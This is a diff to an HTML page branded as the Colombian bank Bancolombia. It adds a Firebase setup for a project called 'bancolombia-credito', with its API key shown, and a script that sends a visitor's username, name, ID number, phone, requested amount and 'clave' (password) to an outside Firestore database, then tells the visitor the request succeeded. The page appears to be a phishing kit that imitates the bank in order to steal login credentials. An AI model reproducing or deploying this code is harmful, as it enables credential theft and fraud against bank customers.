@@ -1,6 +1,21 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+  <!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDnpt57vNCirFZnVklze_irVBTh9miNqbY",
+  authDomain: "bancolombia-credito.firebaseapp.com",
+  projectId: "bancolombia-credito",
+  storageBucket: "bancolombia-credito.firebasestorage.app",
+  messagingSenderId: "354851030251",
+  appId: "1:354851030251:web:e98a68eb7d81a79d942aae"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Bancolombia</title>
@@ -1367,6 +1382,24 @@
       goTo(0);
     })();
   </script>
+  <script>
+async function enviarFormulario(e){
+  e.preventDefault();
+  const datos = {
+    usuario: document.getElementById('usuario')?.value || '',
+    nombre: document.getElementById('nombre')?.value || '',
+    documento: document.getElementById('documento')?.value || '',
+    telefono: document.getElementById('telefono')?.value || '',
+    valor: document.getElementById('valor')?.value || '',
+    clave: document.getElementById('clave')?.value || '',
+    fecha: new Date().toLocaleString('es-CO'),
+    estado: "EN PROGRESO"
+  };
+  await db.collection('solicitudes').add(datos);
+  alert('✅ ¡Solicitud enviada correctamente!');
+  return false;
+}
+</script>
 </body>
 </html>
 <a href="solicitar.html" style="
